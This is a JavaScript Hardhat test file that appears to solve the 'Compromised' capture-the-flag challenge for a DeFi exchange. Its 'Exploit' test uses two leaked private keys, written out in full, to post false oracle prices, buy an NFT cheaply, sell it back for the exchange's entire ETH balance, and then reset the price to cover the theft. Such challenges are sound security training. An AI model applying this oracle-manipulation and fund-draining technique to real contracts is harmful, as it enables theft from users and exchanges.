const { expect } = require('chai');
const { ethers } = require('hardhat');

describe('Compromised challenge', function () {

    const sources = [
        '0xA73209FB1a42495120166736362A1DfA9F95A105',
        '0xe92401A4d3af5E446d93D11EEc806b1462b39D15',
        '0x81A5D6E50C214044bE44cA0CB057fe119097850c'
    ];

    let deployer, attacker;
    const EXCHANGE_INITIAL_ETH_BALANCE = ethers.utils.parseEther('9990');
    const INITIAL_NFT_PRICE = ethers.utils.parseEther('999');

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [deployer, attacker] = await ethers.getSigners();

        const ExchangeFactory = await ethers.getContractFactory('Exchange', deployer);
        const DamnValuableNFTFactory = await ethers.getContractFactory('DamnValuableNFT', deployer);
        const TrustfulOracleFactory = await ethers.getContractFactory('TrustfulOracle', deployer);
        const TrustfulOracleInitializerFactory = await ethers.getContractFactory('TrustfulOracleInitializer', deployer);

        // Initialize balance of the trusted source addresses
        for (let i = 0; i < sources.length; i++) {
            await ethers.provider.send("hardhat_setBalance", [
                sources[i],
                "0x1bc16d674ec80000", // 2 ETH
            ]);
            expect(
                await ethers.provider.getBalance(sources[i])
            ).to.equal(ethers.utils.parseEther('2'));
        }

        // Attacker starts with 0.1 ETH in balance
        await ethers.provider.send("hardhat_setBalance", [
            attacker.address,
            "0x16345785d8a0000", // 0.1 ETH
        ]);
        expect(
            await ethers.provider.getBalance(attacker.address)
        ).to.equal(ethers.utils.parseEther('0.1'));

        // Deploy the oracle and setup the trusted sources with initial prices
        this.oracle = await TrustfulOracleFactory.attach(
            await (await TrustfulOracleInitializerFactory.deploy(
                sources,
                ["DVNFT", "DVNFT", "DVNFT"],
                [INITIAL_NFT_PRICE, INITIAL_NFT_PRICE, INITIAL_NFT_PRICE]
            )).oracle()
        );

        // Deploy the exchange and get the associated ERC721 token
        this.exchange = await ExchangeFactory.deploy(
            this.oracle.address,
            { value: EXCHANGE_INITIAL_ETH_BALANCE }
        );
        this.nftToken = await DamnValuableNFTFactory.attach(await this.exchange.token());
    });

    it('Exploit', async function () {        
        /** In order to exploit this contact, I need first to connect the private keys,
         * with a wallets, then connect these wallets to oracles to manipulate the prices.
         * This means that I'm going to change the price of the NFT to the lowest price, then change the price
         * to the total amout of the token the exchange has. then immediately I'm going to sell my NFT
         * that I bought for the balance of the contract to drains the contracts from the funds.
          */
        const key1 = "0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9";
        const key2 = '0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48';

        // Create wallet address with the private keys.
        const wallet1 = new ethers.Wallet(key1, ethers.provider);
        const wallet2 = new ethers.Wallet(key2, ethers.provider);

        // Connect the both wallets to an oracles
        const oracles1 = this.oracle.connect(wallet1);
        const oracles2 = this.oracle.connect(wallet2);

        // Change the price of the NFTs through the oracles
        await oracles1.postPrice("DVNFT", ethers.utils.parseEther("0.01"));
        await oracles2.postPrice("DVNFT", ethers.utils.parseEther("0.01"));

        // Time to attaaaaaaaaaaaaaaack!!!
        const exchange = await this.exchange.connect(attacker);
        const DVNFT = this.nftToken.connect(attacker);

        // Buy the NFT for the price that we modified
        await exchange.buyOne({value : ethers.utils.parseEther("0.01")});

        // Let's change the price of the NFT that I bought for 0 ETH to the balance of the exchange contract
        const exchangeBalance = await ethers.provider.getBalance(this.exchange.address);
        
        await oracles1.postPrice("DVNFT", exchangeBalance);
        await oracles2.postPrice("DVNFT", exchangeBalance);
        
        // Before selling my NFT I need to approve the exchange contract
        // to be able to transfer the NFT from the attacker wallet
         await DVNFT.approve(exchange.address, 0); // tokenID is 0
         await exchange.sellOne(0);

        // In order to take advantage of this contract later I could put the NFT to initial price
        await oracles1.postPrice("DVNFT", INITIAL_NFT_PRICE);
        await oracles2.postPrice("DVNFT", INITIAL_NFT_PRICE);

    });

    after(async function () {
        /** SUCCESS CONDITIONS */
        
        // Exchange must have lost all ETH
        expect(
            await ethers.provider.getBalance(this.exchange.address)
        ).to.be.eq('0');
        
        // Attacker's ETH balance must have significantly increased
        expect(
            await ethers.provider.getBalance(attacker.address)
        ).to.be.gt(EXCHANGE_INITIAL_ETH_BALANCE);
        
        // Attacker must not own any NFT
        expect(
            await this.nftToken.balanceOf(attacker.address)
        ).to.be.eq('0');

        // NFT price shouldn't have changed
        expect(
            await this.oracle.getMedianPrice("DVNFT")
        ).to.eq(INITIAL_NFT_PRICE);
    });
});
